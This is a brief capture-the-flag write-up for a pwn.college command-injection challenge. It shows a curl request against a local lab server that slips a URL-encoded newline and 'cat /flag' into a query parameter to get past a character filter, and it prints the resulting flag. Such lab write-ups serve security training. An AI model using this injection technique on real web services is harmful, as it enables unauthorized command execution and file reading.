# [CMDi 6](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-8)

## Problem
Sometimes, developers try very hard to filter out potentially dangerous characters. The success in this challenge is almost perfect, but not quite... You'll be stumped for a while, but will laugh at its familiarity when you figure out the solution!

## Steps

After running the server script we see that the server is being served from `http://challenge.localhost:80`. When run the following curl command `curl http://challenge.localhost:80/exercise?root=/flag%0Acat%20/flag` to get the `/flag`.

```bash
curl http://challenge.localhost:80/exercise?root=/flag%0Acat%20/flag
```

## Solution

pwn.college{sxWgPqRw_O7j5bMi6FgSztWFuih.dRzN1YDL3MTM3QzW}
